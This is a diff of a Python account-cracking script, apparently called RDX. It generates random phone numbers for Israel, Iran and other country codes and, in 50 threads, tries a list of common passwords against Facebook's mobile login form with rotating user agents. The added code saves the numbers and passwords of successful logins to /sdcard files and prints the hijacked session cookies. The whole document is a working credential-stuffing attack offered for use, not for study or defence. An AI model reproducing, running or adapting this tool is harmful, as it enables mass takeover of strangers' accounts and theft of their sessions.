+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+966"
-		os.system('clear')
-		print(logo)
-		print(logo30)
-		main()
-	except IOError:
-		print ("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
 
 def israel():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo31)
-	print("\x1b[1;97m(leave the first three digits and the last seven digits of any phone number in this country.Write the remaining digits here. 52,55")
+	print("\x1b[1;97m2,3,4,50,51,52,53,54,55,56,57,58,59,6,77,7,8,9")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+972"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo31)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+972"
-		os.system('clear')
-		print(logo)
-		print(logo31)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
 
 def iran():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo32)
-	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.990,915,901,933,938,902")
+	print("\x1b[1;97m11,13,17,21,23,24,26,45,77,38,41,71")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+98"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo32)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+98"
-		os.system('clear')
-		print(logo)
-		print(logo32)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
 
 
 
@@ -1001,20 +4151,20 @@ def rcrackm(uid,pwx,tl):
 				cid = coki[7:22]
 				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
 				cek_apk(session,coki)
-				open('/sdcard/RDX/ⓇDX-OK.txt', 'a').write( uid+' | '+ps+'\n')
+				open('/sdcard/ⓇDX-OK.txt', 'a').write( uid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[24:39]
-				print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
-				open('/sdcard/RDX/ⓇDX-CP.txt', 'a').write( uid+' | '+ps+' \n')
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP.txt', 'a').write( uid+' | '+ps+' \n')
 				cps.append(cid)
 				break
 			else:
 				continue
 		loop+=1
-		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s][OK-{xr}%s{x}]\033[1;92m[CP-{xr}%s{x}] \r'%(bi,loop,tl,len(oks),len(cps))),
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s][OK:{xr}%s{x}][CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
 		sys.stdout.flush()
 	except:
 		pass
@@ -1131,7 +4281,7 @@ def Rdx2x():
 			manshera.submit(rcrackx,uid,pwx,tl)
 	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
 	print('\x1b[1;94mCrack process has been completed')
-	print('\x1b[1;94mIDs saved in \033[0;92mok.txt,\x1b[1;91mcp.txt')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK.txt,\x1b[1;91mⓇDX-CP.txt')
 	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
 	print('')
 	print('')
@@ -1189,20 +4339,20 @@ def rcrackx(uid,pwx,tl):
 				cid = coki[7:22]
 				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
 				cek_apk(session,coki)
-				open('/sdcard/RDX/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				open('/sdcard/ⓇDX-OK.txt', 'a').write( uid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[24:39]
-				print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
-				open('/sdcard/RDX/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP.txt', 'a').write( uid+' | '+ps+' \n')
 				cps.append(cid)
 				break
 			else:
 				continue
 		loop+=1
-		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s][OK:{xr}%s{x}][CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
 		sys.stdout.flush()
 	except:
 		pass
@@ -1267,7 +4417,7 @@ def Rdx3x():
 			manshera.submit(rcrackx,uid,pwx,tl)
 	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
 	print('\x1b[1;94mCrack process has been completed')
-	print('\x1b[1;94mIDs saved in \033[0;92mok.txt,\x1b[1;91mcp.txt')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK.txt,\x1b[1;91mⓇDX-CP.txt')
 	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
 	print('')
 	print('')
@@ -1324,20 +4474,20 @@ def rcrackx(uid,pwx,tl):
 				cid = coki[7:22]
 				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
 				cek_apk(session,coki)
-				open('/sdcard/RDX/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[24:39]
 				print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
-				open('/sdcard/RDX/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
 				cps.append(cid)
 				break
 			else:
 				continue
 		loop+=1
-		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s][OK:{xr}%s{x}][CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
 		sys.stdout.flush()
 	except:
 		pass
@@ -1788,7 +4938,7 @@ def genpassx():
 		exit()
 
 
-
+#Premium
 logo =("""
 \033[0;96m██████  ██████  ███████ ███    ███ ██ ██    ██ ███    ███ 
 \033[0;96m██   ██ ██   ██ ██      ████  ████ ██ ██    ██ ████  ████ 
@@ -1796,7 +4946,7 @@ logo =("""
 \033[0;96m██      ██   ██ ██      ██  ██  ██ ██ ██    ██ ██  ██  ██ 
 \033[0;96m██      ██   ██ ███████ ██      ██ ██  ██████  ██      ██ 
 \033[1;92m==================================================== """) 
-
+#Rdx-76
 logo1 =("""
 \033[0;92m██████╗ ██████╗ ██╗  ██╗              ███████╗ ██████╗ 
 \033[0;92m██╔══██╗██╔══██╗╚██╗██╔╝              ╚════██║██╔════╝ 
@@ -1812,6 +4962,7 @@ logo54 =("""
 ¦-+++++--+¦¦+++++-+-+-+++¦ ¦++++++++¦
 ~?~ ??????¯??(???)??~?~?~ ??????¯??(???)??~?~?~ ??????¯??
  \033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»""")
+ #
 logo2 =("""
 \033[0;92m ██████ ██       ██████  ███    ██ ██ ███    ██  ██████  
 \033[0;92m██      ██      ██    ██ ████   ██ ██ ████   ██ ██       
@@ -1819,6 +4970,7 @@ logo2 =("""
 \033[0;92m██      ██      ██    ██ ██  ██ ██ ██ ██  ██ ██ ██    ██ 
 \033[0;92m ██████ ███████  ██████  ██   ████ ██ ██   ████  ██████  
 \x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
+#Report
 logo3 =("""
 \x1b[1;92m    Rdx  Report 
 
@@ -1838,6 +4990,7 @@ logo3 =("""
 
 \x1b[1;92m    Rdx  Report 
 \x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
+#Details
 logo4 =("""
 \x1b[1;92m Rdx  Information 
 
@@ -1852,6 +5005,7 @@ logo4 =("""
 
 \x1b[1;92m Rdx  Information 
 \x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
+#Login
 logo5 =("""
 \x1b[1;92m Rdx  Login 
 
@@ -1866,6 +5020,7 @@ logo5 =("""
 
 \x1b[1;92m Rdx  Login 
 \x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
+#Welcome
 logo6 =("""
 \033[0;92m██     ██ ███████ ██       ██████  ██████  ███    ███ ███████ 
 \033[0;92m██     ██ ██      ██      ██      ██    ██ ████  ████ ██      
@@ -1873,6 +5028,7 @@ logo6 =("""
 \033[0;92m██ ███ ██ ██      ██      ██      ██    ██ ██  ██  ██ ██      
 \033[0;92m ███ ███  ███████ ███████  ██████  ██████  ██      ██ ███████ 
 \x1b[1;97m«-----------------\x1b[1;97m Rdx \x1b[1;97m-----------------»""")
+#BD
 logo7 =("""
 \033[0;92m██████      ██████  
 \033[0;92m██   ██     ██   ██ 
@@ -1880,6 +5036,7 @@ logo7 =("""
 \033[0;92m██   ██     ██   ██ 
 \033[0;92m██████      ██████  
 \x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
+#USA
 logo8 =("""
 \x1b[1;91m██╗   ██╗███████╗ █████╗     
 \x1b[1;91m██║   ██║██╔════╝██╔══██╗    
